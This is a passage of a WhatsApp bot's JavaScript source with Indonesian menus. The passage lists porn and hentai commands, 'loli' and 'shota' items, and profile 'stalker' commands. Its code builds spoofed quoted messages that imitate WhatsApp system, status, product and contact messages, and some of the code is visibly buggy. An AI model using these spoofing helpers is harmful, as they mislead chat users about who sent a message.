├⬡ ${prefix}horrorblood teks
├⬡ ${prefix}toxicmaker teks
├⬡ ${prefix}glitch text1|text2
├⬡ ${prefix}pornhub text1|text2
├⬡ ${prefix}avenger text1|text2
├⬡ ${prefix}space text1|text2
├⬡ ${prefix}ninjalogo text1|text2
├⬡ ${prefix}marvelstudio text1|text2
├⬡ ${prefix}lionlogo text1|text2
├⬡ ${prefix}wolflogo text1|text2
├⬡ ${prefix}steel3d text1|text2
├⬡ ${prefix}wallgravity text1|text2
│
├❏ _*SERTI MENU*_
├⬡ ${prefix}bucinserti nama
├⬡ ${prefix}tololserti nama
├⬡ ${prefix}fuckgirlserti nama
├⬡ ${prefix}fuckboyserti nama
├⬡ ${prefix}badgirlserti nama
├⬡ ${prefix}badboyserti nama
├⬡ ${prefix}goodgirlserti nama
├⬡ ${prefix}goodboyserti nama
├⬡ ${prefix}missionpassed teks1|teks2
│
├❏ _*ISLAM MENU*_
├⬡ ${prefix}kisahnabi
├⬡ ${prefix}niatsholat
├⬡ ${prefix}surah
├⬡ ${prefix}asmaulhusna
├⬡ ${prefix}ayatkursi
├⬡ ${prefix}listdoaharian
├⬡ ${prefix}doaharian1
├⬡ ${prefix}doaharian2
├⬡ ${prefix}doaharian3
├⬡ ${prefix}doaharian4
├⬡ ${prefix}doaharian5
├⬡ ${prefix}doaharian6
├⬡ ${prefix}doaharian7
├⬡ ${prefix}doaharian8
├⬡ ${prefix}doaharian9
├⬡ ${prefix}doaharian10
├⬡ ${prefix}doaharian11
├⬡ ${prefix}doaharian12
├⬡ ${prefix}doaharian13
├⬡ ${prefix}doaharian14
├⬡ ${prefix}doaharian15
├⬡ ${prefix}doaharian16
├⬡ ${prefix}doaharian17
├⬡ ${prefix}doaharian18
├⬡ ${prefix}doaharian19
├⬡ ${prefix}doaharian20
├⬡ ${prefix}doaharian21
├⬡ ${prefix}doaharian22
├⬡ ${prefix}doaharian23
├⬡ ${prefix}doaharian24
├⬡ ${prefix}doaharian25
├⬡ ${prefix}doaharian26
├⬡ ${prefix}doaharian27
├⬡ ${prefix}doaharian28
├⬡ ${prefix}doaharian29
├⬡ ${prefix}doaharian30
├⬡ ${prefix}doaharian31
├⬡ ${prefix}doaharian33
├⬡ ${prefix}doaharian34
├⬡ ${prefix}doaharian35
├⬡ ${prefix}doaharian36
│
├❏ _*QUOTES MENU*_
├⬡ ${prefix}quotesimage
├⬡ ${prefix}bucin
├⬡ ${prefix}bucin2
├⬡ ${prefix}pantun
├⬡ ${prefix}pantun2
├⬡ ${prefix}quotes
├⬡ ${prefix}quotesanime
├⬡ ${prefix}quotesislami
├⬡ ${prefix}quotesdilan
├⬡ ${prefix}faktaunik
├⬡ ${prefix}katabijak
├⬡ ${prefix}cerpen
├⬡ ${prefix}cerhor
├⬡ ${prefix}quotemaker quotes|author
│
├❏ _*MEME MENU*_
├⬡ ${prefix}meme1 teks
├⬡ ${prefix}meme2 teks1|teks2
├⬡ ${prefix}meme3 teks1|teks2|teks3
├⬡ ${prefix}meme4 teks
├⬡ ${prefix}meme5 teks
├⬡ ${prefix}meme6 teks1|teks2|teks3
├⬡ ${prefix}meme7 teks1|teks2
├⬡ ${prefix}meme8 teks1|teks2
│
├❏ _*RANDOM MENU*_
├⬡ ${prefix}apakah
├⬡ ${prefix}bisakah
├⬡ ${prefix}kapankah
├⬡ ${prefix}hobby
├⬡ ${prefix}rate
├⬡ ${prefix}cekbapak
├⬡ ${prefix}seberapagay
├⬡ ${prefix}truth
├⬡ ${prefix}dare
├⬡ ${prefix}memeindo
├⬡ ${prefix}covidindo
├⬡ ${prefix}ppestetik
├⬡ ${prefix}randomwallpaper
├⬡ ${prefix}randombahasa
├⬡ ${prefix}tjadian [27/11/2020]
├⬡ ${prefix}artinama
├⬡ ${prefix}zodiak [2005 05 21]
├⬡ ${prefix}weton [11/11/2011]
├⬡ ${prefix}jodoh [surya/mine]
├⬡ ${prefix}tebakumur nama
├⬡ ${prefix}namaninja nama
├⬡ ${prefix}storyheroml
├⬡ ${prefix}tafsirmimpi
│
├❏ _*BAILEYS MENU*_
├⬡ ${prefix}kontak nomor|nama
├⬡ ${prefix}tagme
├⬡ ${prefix}jadian
├⬡ ${prefix}ganteng
├⬡ ${prefix}cantik
├⬡ ${prefix}cekprem
├⬡ ${prefix}exo
├⬡ ${prefix}bts
├⬡ ${prefix}cecan
├⬡ ${prefix}cogan
│
├❏ _*TOOLS MENU*_
├⬡ ${prefix}toimg
├⬡ ${prefix}tovideo
├⬡ ${prefix}tomp3
├⬡ ${prefix}attp text
├⬡ ${prefix}tinyurl url
├⬡ ${prefix}imgtourl
├⬡ ${prefix}nuliskiri text
├⬡ ${prefix}nuliskanan text
├⬡ ${prefix}foliokiri text
├⬡ ${prefix}foliokanan text
├⬡ ${prefix}translate kodebahasa text
├⬡ ${prefix}tts kodebahasa|teks
├⬡ ${prefix}playstore nama apk
│
├❏ _*STALKER MENU*_
├⬡ ${prefix}igstalk username
├⬡ ${prefix}ghstalk username
├⬡ ${prefix}tiktokstalk username
│
├❏ _*ANIME MENU*_
├⬡ ${prefix}waifu
├⬡ ${prefix}loli
├⬡ ${prefix}nekonime
├⬡ ${prefix}megumin
├⬡ ${prefix}sagiri
├⬡ ${prefix}shinobu
├⬡ ${prefix}kanna
├⬡ ${prefix}elf
├⬡ ${prefix}neko
├⬡ ${prefix}shota
├⬡ ${prefix}animefanart
├⬡ ${prefix}wallnime
├⬡ ${prefix}husbu
├⬡ ${prefix}lewdk
├⬡ ${prefix}otakdesu
│
├❏ _*FITUR BARU*_
├⬡ ${prefix}pantun3
├⬡ ${prefix}tongue
├⬡ ${prefix}cerpen2
├⬡ ${prefix}cersex
├⬡ ${prefix}jsholat daerah
├⬡ ${prefix}asupansantuy
├⬡ ${prefix}asupanukhty
├⬡ ${prefix}asupanghea
├⬡ ${prefix}asupanrikagusriani
├⬡ ${prefix}memegen teks|teks|reply foto
├⬡ ${prefix}toimgbb [reply foto]
│
├❏ _*NSFW MENU*_
├⬡ ${prefix}ecchi
├⬡ ${prefix}ahegao
├⬡ ${prefix}hentai4everyone
├⬡ ${prefix}nsfwcum
├⬡ ${prefix}nsfwero
├⬡ ${prefix}nsfwtrap
├⬡ ${prefix}lewdanimegirls
├⬡ ${prefix}animearmpits
├⬡ ${prefix}elf
├⬡ ${prefix}neko
├⬡ ${prefix}sideoppai
├⬡ ${prefix}hololewd
├⬡ ${prefix}animebooty
├⬡ ${prefix}hentai
├⬡ ${prefix}lewdk
├⬡ ${prefix}bokep1
├⬡ ${prefix}bokep2
├⬡ ${prefix}bokep3
├⬡ ${prefix}bokep4
├⬡ ${prefix}bokep5
├⬡ ${prefix}bokep6
├⬡ ${prefix}bokep7
├⬡ ${prefix}bokep8
├⬡ ${prefix}bokep9
├⬡ ${prefix}bokep10
├⬡ ${prefix}bokep11
├⬡ ${prefix}bokep12
├⬡ ${prefix}bokep13
├⬡ ${prefix}bokep14
├⬡ ${prefix}bokep15
├⬡ ${prefix}bokep16
├⬡ ${prefix}bokep17
├⬡ ${prefix}bokep18
├⬡ ${prefix}bokep19
├⬡ ${prefix}bokep20
├⬡ ${prefix}bokep21
├⬡ ${prefix}bokep22
└⬡ ${prefix}bokep23

╭─❏ _*THANKS TO*_ 
│➪ _*ALLAH SWT*_
│➪ _*Alm. Mamah*_
│➪ _*Surya [ Gua ]*_
│➪ _*Aqulzz*_
│➪ _*Reyzenn*_
│➪ _*Lolhuman*_
│➪ _*WhatsApp*_
│➪ _*All creator bot*_
└─────────────────`

const m = simple.smsg(surya, msg)
const wit = moment.tz('Asia/Jayapura').format('HH:mm:ss z')
const wita = moment.tz('Asia/Makassar').format('HH:mm:ss z')
const wib = moment.tz('Asia/Jakarta').format('HH:mm:ss z')
const times = moment.tz('Asia/Jakarta').format('HH:mm:ss')
const timi = moment.tz('Asia/Jakarta').add(30, 'days').calendar();
const timu = moment.tz('Asia/Jakarta').add(20, 'days').calendar();
const timesNow = moment(msg.messageTimestamp * 1000).format('HH:mm:ss - DD•MM•YYYY')
const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')

const q = chats.slice(command.length + 1, chats.length)
const cmd = (type === 'conversation' && msg.message.conversation) ? msg.message.conversation : (type == 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (type == 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : (type == 'extendedTextMessage') && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : ''.slice(1).trim().split(/ +/).shift().toLowerCase()
const body = (type === 'conversation' && msg.message.conversation.startsWith(prefix)) ? msg.message.conversation : (type == 'imageMessage') && msg.message[type].caption.startsWith(prefix) ? msg.message[type].caption : (type == 'videoMessage') && msg.message[type].caption.startsWith(prefix) ? msg.message[type].caption : (type == 'extendedTextMessage') && msg.message[type].text.startsWith(prefix) ? msg.message[type].text : (type == 'listResponseMessage') && msg.message[type].singleSelectReply.selectedRowId ? msg.message[type].singleSelectReply.selectedRowId : (type == 'buttonsResponseMessage') && msg.message[type].selectedButtonId ? msg.message[type].selectedButtonId : (type == 'stickerMessage') && (getCmd(msg.message[type].fileSha256.toString('base64')) !== null && getCmd(msg.message[type].fileSha256.toString('base64')) !== undefined) ? getCmd(msg.message[type].fileSha256.toString('base64')) : ""
const budy = (type === 'conversation') ? msg.message.conversation : (type === 'extendedTextMessage') ? msg.message.extendedTextMessage.text : ''
const commands = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
hit_today.push(commands)
const totalchat = await surya.chats.all()
const arg = body.substring(body.indexOf(' ') + 1)
const ar = args.map((v) => v.toLowerCase())
const argz = body.trim().split(/ +/).slice(1)
const isCmd = body.startsWith(prefix) 
const content = JSON.stringify(msg.message);
var pes = (type === 'conversation' && msg.message.conversation) ? msg.message.conversation : (type == 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (type == 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : (type == 'extendedTextMessage') && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : ''
const messagesC = pes.slice(0).trim()
const senderNumber = sender.split("@")[0]

if (isCmd) cmdadd()

const totalhit = JSON.parse(fs.readFileSync('./database/totalcmd.json'))[0].totalcmd
//const content = JSON.stringify(msg.message)
const botNumber = surya.user.jid
const groupMetadata = isGroup ? await surya.groupMetadata(from) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const groupId = isGroup ? groupMetadata.jid : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
const isGroupAdmins = groupAdmins.includes(sender) || false
const isOwner = Suryaa.includes(sender)
const isOwner2 = Mecha.includes(sender)
const isPremium = isOwner ? true : _prem.checkPremiumUser(sender, premium)
const isClaimOn = _claim.includes(sender)
const isSewa = _sewa.checkSewaGroup(from, sewa)
const isBan = cekBannedUser(sender, ban)
const isAfkOn = afk.checkAfkUser(sender, _afk)
const isRegister = checkRegisteredUser(sender)
const isUser = pendaftar.includes(sender)
const isBlocked = blocked.includes(sender)

const isLelah = isGroup ? grupcapek.includes(from) : false
const isMuted = isGroup ? mute.includes(from) : false
const isAntiLinkGrup = isGroup ? antilinkgrup.includes(from) : false
const isWelcome = isGroup ? welcome.includes(from) : false
const isLeft = isGroup ? left.includes(from) : false
const isAutoSticker = isGroup ? autosticker.includes(from) : false
const isAntiTagSurya = isGroup ? antitagsurya.includes(from) : false
const isAntiLinkYoutube = isGroup ? antilinkyoutube.includes(from) : false
const isAntiLinkFacebook = isGroup ? antilinkfacebook.includes(from) : false
const isAntiLinkTiktok = isGroup ? antilinktiktok.includes(from) : false
const isAntiLinkInstagram = isGroup ? antilinkinstagram.includes(from) : false
const isAntiVirtex = isGroup ? antivirtex.includes(from) : false
const isAntiTag = isGroup ? antitag.includes(from) : false
const isSimih = sender ? simih.includes(from) : false
const isAutoVideo = isGroup ? autovideo.includes(from) : false
const isAntiLinktelegram = isGroup ? antilinktelegram.includes(from) : false
const isAntiWame = isGroup ? antiwame.includes(from) : false
const isBadword = isGroup ? grupbadword.includes(from) : false
const isAutoImage = isGroup ? autoimage.includes(from) : false
const isAutoColong = isGroup ? autocolong.includes(from) : false
const isAntiLink = isGroup ? antilink.includes(from) : false
const isAntiVO = isGroup ? antiviewonce.includes(from) : false
const isAntiBule = isGroup ? antibule.includes(from) : false
const isSholat = isGroup ? psholat.includes(from) : false
const isAutoJoin = isGroup ? autojoin.includes(from) : false
const isVote = isGroup ? voting.includes(from) : false
const isLevelingOn = isGroup ? _leveling.includes(from) : false
const isMiningOn = isGroup ? mining.includes(from) : false
const isNsfw = isGroup ? nsfw.includes(from) : false
const isAntiHapus = chats ? antihapus.includes(from) : false

let vipcek = ms(_prem.getPremiumExpired(sender, premium) - Date.now())
const expired = `${vipcek.days} day ${vipcek.hours} hour ${vipcek.minutes} minute ${vipcek.seconds} second`
//const gcounti = setting.gcount
const gcount = isPremium ? gcounti.prem : gcounti.user
const isUrl = (url) => {
return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
}
cmhit.push(command)
function monospace(string) {
return '```' + string + '```'
}
function jsonformat(string) {
return JSON.stringify(string, null, 2)
}
function randomNomor(angka){
return Math.floor(Math.random() * angka) + 1
}
const nebal = (angka) => {
return Math.floor(angka)
}

const reply = (teks) => {
surya.sendMessage(from, teks, text, {contextInfo :{text: 'hi',
"forwardingScore": 1000000000,
isForwarded: false,
sendEphemeral: false,
"externalAdReply": {
"title": `Creator Mecha Botz By\nJabal Surya Ngalam 🌹`,
"body": "Jangan Lupa Donasi ☕",
"previewType": "PHOTO",
"thumbnailUrl": "https://i.ibb.co/Pt0wv6V/4cc3fc551dbd.jpg",
"thumbnail": "https://i.ibb.co/Pt0wv6V/4cc3fc551dbd.jpg",
"sourceUrl": `http://Wa.me/62895415497664?text=Hai+sayank`
},mentionedJid:[sender]}, quoted : msg})
}
const sendMess = (hehe, teks) => {
return surya.sendMessage(hehe, teks, text)
}
const mentions = (teks, memberr, id) => {
let ai = (id == null || id == undefined || id == false) ? surya.sendMessage(from, teks.trim(), extendedText, {contextInfo: {"mentionedJid": memberr}}) : surya.sendMessage(from, teks.trim(), extendedText, {quoted: msg, contextInfo: {"mentionedJid": memberr}})
return ai
}
const fakeimage = (teks) => {
returnsurya.sendMessage(from, fs.readFileSync(setting.pathImg), MessageType.image,
{
quoted: {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) },
message: { "imageMessage": {
"mimetype": "image/jpeg", 
"caption": fake, 
"jpegThumbnail": fs.readFileSync(setting.pathImg)
}
}
},
caption: teks
})
}
const fakestatus = (teks) => {
surya.sendMessage(from, teks, text, {
quoted: {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
},
message: {
"imageMessage": {
"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
"mimetype": "image/jpeg",
"caption": fake,
"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
"fileLength": "28777",
"height": 1080,
"width": 1079,
"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
"fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
"directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
"mediaKeyTimestamp": "1610993486",
"jpegThumbnail": fs.readFileSync(setting.pathImg),
"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
}
}
}
})
}

//FAKE LINK
const Flink = (teks) => {
surya.sendMessage(from, teks, text, {contextInfo :{text: 'hi',
"forwardingScore": 1000000000,
isForwarded: false,
sendEphemeral: false,
"externalAdReply": {
"title": `Creator Mecha Botz By\nJabal Surya Ngalam 🌹`,
"body": "Jangan Lupa Donasi ☕",
"previewType": "PHOTO",
"thumbnailUrl": "https://i.ibb.co/Pt0wv6V/4cc3fc551dbd.jpg",
"thumbnail": "https://i.ibb.co/Pt0wv6V/4cc3fc551dbd.jpg",
"sourceUrl": `http://Wa.me/62895415497664?text=Bang+mau+donasi`
},mentionedJid:[sender]}, quoted : msg})
}
//FAKEREPLY PRODUCT
const Faketoko = (teks) => {
let anu = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
},
message: {
"productMessage": {
"product": {
"productImage":{
"mimetype": "image/jpeg",
"jpegThumbnail": fs.readFileSync(`./media/Surya.jpg`)
},
"title": '𝑺𝒖𝒓𝒚𝒂 - 𝑴𝒆𝒄𝒉𝒂 𝑩𝒐𝒕𝒛',
"description": "Self Surya nih Boss",
"currencyCode": "IDR",
"priceAmount1000": "1000000000",
"retailerId": "Self Bot",
"productImageCount": 1
},
"businessOwnerJid": `0@s.whatsapp.net`
}
}
}
surya.sendMessage(from, teks, MessageType.text, {quoted: anu, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
}
//FAKE KONTAK
const fkontak = { 
key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `62895415497664@s.whatsapp.net` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': fs.readFileSync('./sticker/thumb.jpeg')}}}
//FAKE STICKER
const fsticker = {
key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},"message": {"stickerMessage": { "url": "https://mmg.whatsapp.net/d/f/Am6FBfNf-E2f1VoGBXkPaNAy7L6Tw_HMavKrHEt48QM4.enc","fileSha256": "Yfj8SW7liSEnDakvyVlXVZQ1LJBC9idn09X7KHe8HTc=","fileEncSha256": "F854aUrzgAkBTOVULpne4oSIi6S04Jo56pjZEo+p+9U=","mediaKey": "Z3nA2asclAAwWHngNO/vJ81qxOE2/0gkEnXak+NxPV4=","mimetype": "image/webp","height": 64,"width": 64,"directPath": "/v/t62.15575-24/12097272_1193895144391295_8973688483514349023_n.enc?ccb=11-4&oh=5a9d7147627a8355569f1a641b9ebee3&oe=60C65E73","fileLength": "7186","mediaKeyTimestamp": "1622815545","isAnimated": false}}}
//FAKE VN
const fvn = {
key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "62895415497664@s.whatsapp.net" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds": "9999999","ptt": "true"}}}
//FAKE TEXT
const ftext = {
key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${fake}`,"title": `Hmm`,'jpegThumbnail': fs.readFileSync('./sticker/thumb.jpeg')}}}
//FAKE LIVE ACTION
const floc = {
key: {"fromMe": false,"participant": `0@s.whatsapp.net`, "remoteJid": "6289530863358-1621036495@g.us" },message: { "liveLocationMessage": { "title":`${fake}`,}}}
//FAKEREPLY TROLI
const ftroli = {
key: {fromMe: true,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: {orderMessage: {itemCount : 2021,status: 1,surface : 1,message: `${fake}`,orderTitle: 'Bang',thumbnail: fs.readFileSync('./sticker/thumb.jpeg'), sellerJid: '0@s.whatsapp.net'}}}
//FAKEREPLY VIDEO
const fvideo = {
key: {fromMe: false,participant: `62895415497664@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "videoMessage": { "title":"hallo bang","h": `Hmm`,'seconds': '2105', 'caption': `${fake}`,'jpegThumbnail': fs.readFileSync('./sticker/thumb.jpeg')}}}
//FAKEREPLY GROUPINVITE
const fgc = {
key: {"fromMe": false,"participant": "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "62895619083555-1616169743@g.us","inviteCode": "mememteeeekkeke","groupName": "P", "caption": `${fake}`, 'jpegThumbnail': fs.readFileSync('./sticker/thumb.jpeg')}}}
//FAKEREPLY GIF
const fgif = {
key: {fromMe: false,participant: `62895415497664@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "videoMessage": { "title":"hallo bang","h": `Hmm`,'seconds': '99999', 'gifPlayback': 'true', 'caption': `${fake}`,'jpegThumbnail': fs.readFileSync('./sticker/thumb.jpeg')}}} 

//FAKE YOUTUBE
const fakeyt = (teks) => {
surya.sendMessage(from, teks, text,{contextInfo :{text: 'hi',
"forwardingScore": 1000,
isForwarded: true,
sendEphemeral: true,
"externalAdReply": {
"title": `Hallo ${pushname}` ,
"body": `${Ucapan}`,
"mediaType": "2",
"thumbnailUrl": "https://i.ibb.co/CMmF2qD/a704bc3b6536.jpg",
"mediaUrl": "https://youtu.be/3jYbJq2JMiM",
"thumbnail": fs.readFileSync('./sticker/mecha.jpeg'),
"sourceUrl": "https://www.instagram.com/surya_skylark05",
},mentionedJid:[sender]}, quoted : ftroli})
}

const sendStickerFromUrl = async (to, url) => {
 var names = Date.now() / 10000;
 var download = function (uri, filename, callback) {
request.head(uri, function (err, res, body) {
 request(uri)
.pipe(fs.createWriteStream(filename))
.on("close", callback);
});
 }; 
 download(url, "./stik" + names + ".png", async function () {
console.log("selesai");
let filess = "./stik" + names + ".png";
let asw = "./stik" + names + ".webp";
exec(
 `ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`,
 (err) => {
let media = fs.readFileSync(asw);
surya.sendMessage(to, media, MessageType.sticker, { quoted: msg });
fs.unlinkSync(filess);
fs.unlinkSync(asw);
 }
);
 });
}; 

const sendStickerUrl = async(to, url) => {
console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Downloading sticker...'))
var names = getRandom('.webp')
var namea = getRandom('.png')
var download = function (uri, filename, callback) {
request.head(uri, function (err, res, body) {
request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
download(url, namea, async function () {
let filess = namea
let asw = names
require('../lib/exif.js')
exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
exec(`webpmux -set exif ./sticker/data.exif ${asw} -o ${asw}`, async (error) => {
let media = fs.readFileSync(asw)
surya.sendMessage(to, media, sticker, {quoted: msg})
console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Succes send sticker...'))
});
});
});
}

async function sendFileFromUrl(from, url, caption, msg, men) {
let mime = '';
let res = await axios.head(url)
mime = res.headers['content-type']
let type = mime.split("/")[0]+"Message"
if(mime === "image"){
type = MessageType.video
mime = Mimetype.gif
}
if(mime === "application/pdf"){
type = MessageType.document
mime = Mimetype.pdf
}
if(mime.split("/")[0] === "audio"){
mime = Mimetype.mp4Audio
}
return surya.sendMessage(from, await getBuffer(url), type, {caption: caption, quoted: msg, mimetype: mime, contextInfo: {"mentionedJid": men ? men : []}})
}
const textImg = (teks) => {
return surya.sendMessage(from, teks, text, {quoted: msg, thumbnail: fs.readFileSync(setting.pathImg)})
}

const isMedia = (type === 'imageMessage' || type === 'videoMessage')
const isImage = (type === 'imageMessage')
const isVideo = (type === 'videoMessage')
const isAudio = (type === 'audioMessage')
const isSticker = (type == 'stickerMessage')
const isList = (type == 'listResponseMessage')
const isButton = (type == 'buttonsResponseMessage')
const isViewOnce = (type == 'viewOnceMessage')
const isQuotedImage = isQuotedMsg ? (quotedMsg.type === 'imageMessage') ? true : false : false
const isQuotedAudio = isQuotedMsg ? (quotedMsg.type === 'audioMessage') ? true : false : false
const isQuotedDocument = isQuotedMsg ? (quotedMsg.type === 'documentMessage') ? true : false : false
const isQuotedVideo = isQuotedMsg ? (quotedMsg.type === 'videoMessage') ? true : false : false
const isQuotedSticker = isQuotedMsg ? (quotedMsg.type === 'stickerMessage') ? true : false : false
const isQuotedList = isQuotedMsg ? (quotedMsg.type === 'listResponseMessage') ? true : false : false
const isQuotedButton = isQuotedMsg ? (quotedMsg.type === 'buttonsResponseMessage') ? true : false : false
const isQuotedContact = isQuotedMsg ? (quotedMsg.type === 'contactMessage') ? true : false : false
const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')

if (!msg.key.remoteJid.endsWith('@g.us') && offline){
if (!msg.key.fromMe){
if (isOff(msg.key.remoteJid)) return
addOff(msg.key.remoteJid)
let heheh = ms(Date.now() - waktu)
const buttons = [{buttonId: 'verify', buttonText: {displayText: 'Okey'}, type: 1}]
const buttonsMessage = {
contentText: `@${Suryaa.split('@')[0]} sedang Offline\n\n*Alasan :* ${alasanafk}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik\n\nSilahkan hubungi lagi setelah Online`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 1
}
surya.sendMessage(msg.key.remoteJid, buttonsMessage, MessageType.buttonsMessage, {
contextInfo: {mentionedJid: [Suryaa]}, msg})
}
}
if (msg.key.remoteJid.endsWith('@g.us') && offline) {
if (!msg.key.fromMe){
if (msg.message.extendedTextMessage != undefined){
if (msg.message.extendedTextMessage.contextInfo != undefined){
if (msg.message.extendedTextMessage.contextInfo.mentionedJid != undefined){
for (let ment of msg.message.extendedTextMessage.contextInfo.mentionedJid) {
if (ment === surya.user.jid){
if (isOff(msg.key.remoteJid)) return
addOff(msg.key.remoteJid)
let heheh = ms(Date.now() - waktu)
const buttons = [{buttonId: 'verify', buttonText: {displayText: 'Okey'}, type: 1}]
const buttonsMessage = {
contentText: `@${Suryaa.split('@')[0]} sedang Offline\n\n*Alasan :* ${alasanafk}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik\n\nSilahkan hubungi lagi setelah Online`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 1
}
surya.sendMessage(msg.key.remoteJid, buttonsMessage, MessageType.buttonsMessage, {
contextInfo: {mentionedJid: [Suryaa, `${creator}@s.whatsapp.net`]}, msg})
}
}
}
}
}
}
}

//get lose
const getWins = (sender, total) => {
            let position = false
            Object.keys(_win).forEach((i) => {
                if (_win[i].jid === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _win[position].win -= total
                 fs.writeFileSync('./database/tttwin.json', JSON.stringify(_win))
            }
        }
 
const getLose = (sender, total) => {
            let position = false
            Object.keys(_lose).forEach((i) => {
                if (_lose[i].jid === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _lose[position].lose -= total
                 fs.writeFileSync('./database/tttlose.json', JSON.stringify(_lose))
            }
        }

const checkWin = (sender) => {
            let found = false
            for (let wn of _win) {
                if (wn.jid === sender) {
                    let winCounts = winawal - wn.win
                    if (winCounts <= 0) return surya.sendMessage(from, `Anda belum pernah memainkan game tictactoe\n\nJumlah kemenangan kamu didalam game *TicTacToe* adalah: ${winCounts}`, text, {quoted: msg})
                    return `${winCounts}`
                    found = true
                }
            }
            if (found === false) {
                let obj = { jid: sender, win: 0 }
                _win.push(obj)
                fs.writeFileSync('./database/tttwin.json', JSON.stringify(_win))
                return `${winCounts}`
            }
        }
        const checkLose = (sender) => {
            let found = false
            for (let ls of _lose) {
                if (ls.jid === sender) {
                    let loseCounts = loseawal - ls.lose
                    if (loseCounts <= 0) return surya.sendMessage(from, `Anda belum pernah memainkan game tictactoe\n\nJumlah kemenangan kamu didalam game *TicTacToe* adalah: ${winCounts}`, text, {quoted: msg})
                    return `${loseCounts}`
                    found = true
                }
            }
            if (found === false) {
                let obj = { jid: sender, lose: 0 }
                _lose.push(obj)
                fs.writeFileSync('./database/tttlose.json', JSON.stringify(_lose))
                return `${loseCounts}`
            }
        }
        if (tictactoe.hasOwnProperty(senderNumber) && ["Nyerah", "nyerah"].includes(budy)) {
        let teks0 = `@${sender.split("@")[0]} Menyerah\n_*Yhahaha cupu*_`
        return surya.sendMessage(from, teks0, text, {quoted:msg, contextInfo:{mentionedJid: [orangnye]}}).then(() => {
        let naa = ky_ttt.filter(toek => !toek.id.includes(from)) 
        ky_ttt = naa 
                        delete tictactoe[senderNumber]
                        fs.writeFileSync("./database/tictactoe.json", JSON.stringify(tictactoe))
                        fs.unlinkSync("./temp/" + from + ".json");
        })
        }

// FAMILY 100
const addfam = (chatId, jawaban, expired, _db) => {
    let obi = { id: chatId, jawaban: jawaban, expired: Date.now() + toMs(`${expired}s`) }
    _db.push(obi)
}
const getjawaban100 = (chatId, _db) => {
    let found = false
    Object.keys(_db).forEach((i) => {
        if (_db[i].id === chatId) {
            found = i
        }
    })
    if (found !== false) {
        return _db[found].jawaban
    }
}
